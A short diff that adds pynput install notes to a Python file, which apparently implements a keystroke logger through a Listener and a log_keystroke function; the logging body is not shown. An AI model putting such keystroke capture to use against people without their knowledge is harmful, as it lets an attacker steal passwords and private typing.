@@ -1,3 +1,8 @@
+"""
+install pynput library using this command: pip install pynput
+
+to know more about pynput visit: https://pypi.org/project/pynput/
+"""
 from pynput.keyboard import Listener
 
 def log_keystroke(key):
